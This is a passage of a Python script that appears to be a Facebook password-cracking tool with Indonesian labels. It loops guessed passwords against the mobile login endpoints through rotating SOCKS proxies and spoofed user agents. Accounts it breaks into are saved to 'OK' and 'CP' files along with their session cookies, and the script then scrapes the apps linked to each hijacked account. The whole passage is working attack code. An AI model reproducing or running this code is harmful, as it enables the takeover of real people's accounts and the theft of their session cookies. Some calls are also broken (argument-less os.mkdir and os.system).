	'Dalvik/2.1.0 (Linux; U; Android 5.0.1; GT-I9505 Build/LRX22C) [FBAN/Orca-Android;FBAV/130.0.0.15.89;FBPN/com.facebook.orca;FBLC/sv_SE;FBBV/67467545;FBCR/S COMVIQ;FBMF/samsung;FBBD/samsung;FBDV/GT-I9505;FBSV/5.0.1;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]'])
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	for pw in pwv:
		try:
			nip=random.choice(prox)
			proxs= {'http': 'socks4://'+nip}
			ses.headers.update({"Host": "m.facebook.com",
	"cache-control": "max-age=0",
	"upgrade-insecure-requests": "1",
	"user-agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1",
	"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
	"sec-fetch-site": "same-origin",
	"sec-fetch-mode": "navigate",
	"sec-fetch-user": "?1",
	"sec-fetch-dest": "document",
	"referer": "https://m.facebook.com/login/device-based/password/?uid="+idf+"&flow=login_no_pin&refsrc=deprecated&_rdr",
	"accept-encoding": "gzip, deflate",
	"accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
			p = ses.get('https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://m.facebook.com/v2.3/dialog/oauth?app_id=124024574287414&cbt=1651658200978&e2e=%7B%22init%22%3A1651658200978%7D&sso=chrome_custom_tab&scope=email&state%7B%220_auth_logger_id%22%3A%2268f15bae-23f8-463c-8660-5cf1226d97f6%22%2C%227_challenge%22%3A%22dahj28hqtietmhrgprpp%22%2C%223_method%22%3A%22custom_tab%22%7D&redirect_uri=fbconnect%3A%2F%2Fcct.com.instathunder.app&response_type=token%2Csigned_request%2Cgraph_domain%2Cgranted_scopes&return_scopes=true&ret=login&fbapp_pres=0&logger_id=68f15bae-23f8-463c-8660-5cf1226d97f6&tp=unspecified","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="106", "Chromium";v="99"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://m.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'com.facebook.katana','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://m.facebook.com/login/device-based/password/?uid='+idf+'&next=https%3A%2F%2Fm.facebook.com%2Fv2.9%2Fdialog%2Foauth%2F%3Fclient_id%3D1862952583919182%26response_type%3Dtoken%26redirect_uri%3Dhttps%253A%252F%252Fwww.tiktok.com%252Flogin%252F%26state%3D%257B%2522client_id%2522%253A%25221862952583919182%2522%252C%2522network%2522%253A%2522facebook%2522%252C%2522display%2522%253A%2522popup%2522%252C%2522callback%2522%253A%2522_hellojs_arka2coa%2522%252C%2522state%2522%253A%2522%2522%252C%2522redirect_uri%2522%253A%2522https%253A%252F%252Fwww.tiktok.com%252Flogin%252F%2522%252C%2522scope%2522%253A%2522basic%2522%257D%26scope%3Dpublic_profile%26auth_type%3Dreauthenticate%26display%3Dpopup','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
			po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
			if "checkpoint" in po.cookies.get_dict().keys():
				#print(f'\r{x}└──{k} {idf}|{pw} •{b}{tahun(idf)}{x}\n└──{m} {ua}{N}')
				print('\n')
				Console(width=100).print(Panel(f"[bold yellow]\n╭──▸ [bold white]USERNAME  [bold black]:[bold yellow] {idf}\n╰──▸[bold white] PASSWORD  [bold black]:[bold yellow] {pw}\n",title='[bold yellow]AKUN-CP[bold yellow]', style='bold yellow'))
				Console(width=100).print(Panel(f"[bold white]{tahun(idf)}[bold yellow]", title='TAHUN-PEMBUATAN', style='bold yellow'),justify='center')
				Console(width=100).print(Panel(f"[bold magenta]{ua}[bold yellow]",title='[bold yellow]USER-AGENT-CP[bold yellow]', style='bold yellow'),justify='center')   
				print('\n')
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				headapp={"user-agent":"SupportsFresco=1 Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-J210F Build/MMB29Q) Source/1 [FBAN/EMA;UNITY_PACKAGE/342;FBBV/107586706;FBAV/172.0.0.8.182;FBDV/SM-J210F;FBLC/id_ID;FBOP/20]"}
				if 'no' in taplikasi:
					ok+=1
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					#print(f'\r{x}└──{H} {idf}|{pw} •{b}{tahun(idf)}{x}\n└──{H} {kuki}{x}\n└──{m} {ua}{N}')
					print('\n')
					Console(width=100).print(Panel(f"[bold green]\n╭──▸ [bold white]USERNAME  [bold black]:[bold green] {idf}\n╰──▸[bold white] PASSWORD  [bold black]:[bold green] {pw}\n",title='[bold green]AKUN-OK[bold green]', style='bold green'))
					Console(width=100).print(Panel(f"[bold white]{tahun(idf)}[bold green]", title='TAHUN-PEMBUATAN', style='bold green'),justify='center')
					Console(width=100).print(Panel(f"[bold blue]{kuki}[bold green]",title='[bold green]COOKIE-OK[bold purple]', style='bold green'),justify='center')
					Console(width=100).print(Panel(f"[bold purple]{ua}[bold green]",title='[bold green]USER-AGENT-OK[bold purple]', style='bold green'),justify='center')
					print('\n')
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					break
				elif 'ya' in taplikasi:
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					user=idf
					infoakun = ""
					session = requests.Session()
					cek2 = session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies=coki,headers=headapp).text
					cek =session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies=coki,headers=headapp).text
					apkaktif=re.findall('</i><div class=".*?"><span class=".*?">(.*?)</span><div></div><div class=".*?">(.*?)</div></div>',str(cek))
					nok=1
					for muncul in apkaktif:
						infoakun+= (f"	{x}[{h}{nok}{x}] {b}{muncul[0]} {muncul[1]}{x}\n")
						nok+=1

					hit=0
					apkexp=re.findall('</i><div class=".*?"><span class=".*?">(.*?)</span><div></div><div class=".*?">(.*?)</div></div>',str(cek2))
					hit=0
					for muncul in apkexp:
						hit+=1
						infoakun += (f"	{x}[{k}{hit}{x}] {m}{muncul[0]} {muncul[1]}{x}\n")
					#print(f'\r{x}└──{H} {idf}|{pw} •{b}{tahun(idf)}{x}\n└──{H} {kuki}{x}\n└──{m} {ua}\n{infoakun}{x}')
					print('\n')
					Console(width=100).print(Panel(f"[bold green]\n╭──▸ [bold white]USERNAME  [bold black]:[bold green] {idf}\n╰──▸[bold white] PASSWORD  [bold black]:[bold green] {pw}\n",title='[bold green]AKUN-OK[bold green]', style='bold green'))
					Console(width=100).print(Panel(f"[bold white]{tahun(idf)}[bold green]", title='TAHUN-PEMBUATAN', style='bold green'),justify='center')
					Console(width=100).print(Panel(f"[bold white]{infoakun}[bold green]", title='INFO-AKUN', style='bold green'))
					Console(width=100).print(Panel(f"[bold blue]{kuki}[bold green]",title='[bold green]COOKIE-OK[bold purple]', style='bold green'),justify='center')
					Console(width=100).print(Panel(f"[bold purple]{ua}[bold green]",title='[bold green]USER-AGENT-OK[bold purple]', style='bold green'),justify='center')
					print('\n')
					ok+=1
					break

			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(1)
	loop+=1
###===============> [RANDOM-UGENT] <===============###

###================> [METHODE-V2] <================###
def crackfree(idf,pwv):
	global loop,ok,cp
	bo = random.choice([m,k,h,b,u,x])
	sys.stdout.write(f"\r{B}[{bo}XXX-SIGA{B}] {B}[{P}{loop}{P}/{P}{len(id)}{B}] {B}[{P}OK {H}{ok}{P} CP {k}{cp}{x}{B}] [{bo}{'{:.0%}'.format(loop/float(len(id)))}{B}]{P}  "),
	sys.stdout.flush()
	ua = random.choice(redmi)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	for pw in pwv:
		try:
			nip=random.choice(prox)
			proxs= {'http': 'socks5://'+nip}
			ses.headers.update({'Host': 'mbasic.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
			p = ses.get('https://mbasic.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1651658200978%26e2e%3D%257B%2522init%2522%253A1651658200978%257D%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.instathunder.app%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D68f15bae-23f8-463c-8660-5cf1226d97f6%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.instathunder.app%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://m.facebook.com/v2.3/dialog/oauth?app_id=124024574287414&cbt=1651658200978&e2e=%7B%22init%22%3A1651658200978%7D&sso=chrome_custom_tab&scope=email&state=%7B%220_auth_logger_id%22%3A%2268f15bae-23f8-463c-8660-5cf1226d97f6%22%2C%227_challenge%22%3A%22dahj28hqtietmhrgprpp%22%2C%223_method%22%3A%22custom_tab%22%7D&redirect_uri=fbconnect%3A%2F%2Fcct.com.instathunder.app&response_type=token%2Csigned_request%2Cgraph_domain%2Cgranted_scopes&return_scopes=true&ret=login&fbapp_pres=0&logger_id=68f15bae-23f8-463c-8660-5cf1226d97f6&tp=unspecified","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={'Host': 'mbasic.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://mbasic.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://mbasic.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1651658200978%26e2e%3D%257B%2522init%2522%253A1651658200978%257D%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.instathunder.app%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D68f15bae-23f8-463c-8660-5cf1226d97f6%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.instathunder.app%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
			po = ses.post('https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
			if "checkpoint" in po.cookies.get_dict().keys():
				#print(f'\r{x}└──{k} {idf}|{pw} •{b}{tahun(idf)}{x}\n└──{m} {ua}{N}')
				print('\n')
				Console(width=100).print(Panel(f"[bold yellow]\n╭──▸ [bold white]USERNAME  [bold black]:[bold yellow] {idf}\n╰──▸[bold white] PASSWORD  [bold black]:[bold yellow] {pw}\n",title='[bold yellow]AKUN-CP[bold yellow]', style='bold yellow'))
				Console(width=100).print(Panel(f"[bold white]{tahun(idf)}[bold yellow]", title='TAHUN-PEMBUATAN', style='bold yellow'),justify='center')
				Console(width=100).print(Panel(f"[bold magenta]{ua}[bold yellow]",title='[bold yellow]USER-AGENT-CP[bold yellow]', style='bold yellow'),justify='center')   
				print('\n')
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				headapp={"user-agent":"Mozilla/5.0 (Linux; U; Android 4.4.2; zh-CN; HUAWEI MT7-TL00 Build/HuaweiMT7-TL00) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.3.8.909 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/375.1.0.28.111;]]"}
				if 'ya' in taplikasi:
					ok+=1
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					#print(f'\r{x}└──{H} {idf}|{pw} •{b}{tahun(idf)}{x}\n└──{H} {kuki}{x}\n└──{m} {ua}{N}')
					print('\n')
					Console(width=100).print(Panel(f"[bold green]\n╭──▸ [bold white]USERNAME  [bold black]:[bold green] {idf}\n╰──▸[bold white] PASSWORD  [bold black]:[bold green] {pw}\n",title='[bold green]AKUN-OK[bold green]', style='bold green'))
					Console(width=100).print(Panel(f"[bold white]{tahun(idf)}[bold green]", title='TAHUN-PEMBUATAN', style='bold green'),justify='center')
					Console(width=100).print(Panel(f"[bold blue]{kuki}[bold green]",title='[bold green]COOKIE-OK[bold purple]', style='bold green'),justify='center')
					Console(width=100).print(Panel(f"[bold purple]{ua}[bold green]",title='[bold green]USER-AGENT-OK[bold purple]', style='bold green'),justify='center')
					print('\n')
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					break
				elif 'ya' in taplikasi:
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					user=idf
					infoakun = ""
					session = requests.Session()
					cek2 = session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies=coki,headers=headapp).text
					cek =session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies=coki,headers=headapp).text
					apkaktif=re.findall('</i><div class=".*?"><span class=".*?">(.*?)</span><div></div><div class=".*?">(.*?)</div></div>',str(cek))
					nok=1
					for muncul in apkaktif:
						infoakun+= (f"	{x}[{h}{nok}{x}] {b}{muncul[0]} {muncul[1]}{x}\n")
						nok+=1

					hit=0
					apkexp=re.findall('</i><div class=".*?"><span class=".*?">(.*?)</span><div></div><div class=".*?">(.*?)</div></div>',str(cek2))
					hit=0
					for muncul in apkexp:
						hit+=1
						infoakun += (f"	{x}[{k}{hit}{x}] {m}{muncul[0]} {muncul[1]}{x}\n")
					#print(f'\r{x}└──{H} {idf}|{pw} •{b}{tahun(idf)}{x}\n└──{H} {kuki}{x}\n└──{m} {ua}\n{infoakun}{x}')
					print('\n')
					Console(width=100).print(Panel(f"[bold green]\n╭──▸ [bold white]USERNAME  [bold black]:[bold green] {idf}\n╰──▸[bold white] PASSWORD  [bold black]:[bold green] {pw}\n",title='[bold green]AKUN-OK[bold green]', style='bold green'))
					Console(width=100).print(Panel(f"[bold white]{tahun(idf)}[bold green]", title='TAHUN-PEMBUATAN', style='bold green'),justify='center')
					Console(width=100).print(Panel(f"[bold white]{infoakun}[bold green]", title='INFO-AKUN', style='bold green'))
					Console(width=100).print(Panel(f"[bold blue]{kuki}[bold green]",title='[bold green]COOKIE-OK[bold purple]', style='bold green'),justify='center')
					Console(width=100).print(Panel(f"[bold purple]{ua}[bold green]",title='[bold green]USER-AGENT-OK[bold purple]', style='bold green'),justify='center')
					print('\n')
					ok+=1
					break

			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(1)
	loop+=1
	
###===============> [MENGECEK-APLIKASI] <===============###
def cek_apk(session,cookie):
	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":cookie}).text
	sop = BeautifulSoup(w,"html.parser")
	x = sop.find("form",method="post")
	game = [i.text for i in x.find_all("h3")]
	if len(game)==0:
		#print(f"\n {N}[{M}!{N}] opshh tidak ada aplikasi aktif di akun ini.")
		Console(width=100).print(Panel("[bold red]OPSS TIDAK ADA APLIKASI YANG AKTIF DI AKUN INI [bold yellow]!!!", style='bold blue'), justify="center")
	else:
		for i in range(len(game)):
			print("   %s%s. %s%s"%(H,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),N))
	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":cookie}).text
	sop = BeautifulSoup(w,"html.parser")
	x = sop.find("form",method="post")
	game = [i.text for i in x.find_all("h3")]
	if len(game)==0:
		#print(f"\n {N}[{M}!{N}] opshh tidak ada aplikasi kadaluarsa di akun ini.")
		Console(width=100).print(Panel("[bold red]OPSS TIDAK ADA APLIKASI YANG AKTIF DI AKUN INI [bold yellow]!!!", style='bold blue'), justify="center")
	else:
		for i in range(len(game)):
			print("   %s%s. %s%s"%(K,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),N))

###===============> [MAIN-MKDIR] <===============###
if __name__=='__main__':
	try:os.system('git pull')
	except:pass
	try:os.mkdir('OK')
	except:pass
	try:os.mkdir('CP')
	except:pass
	try:os.mkdir()
	except:pass
	try:os.system('touch .prox.txt')
	except:pass
	try:os.system()
	except:pass
	login('kamu')
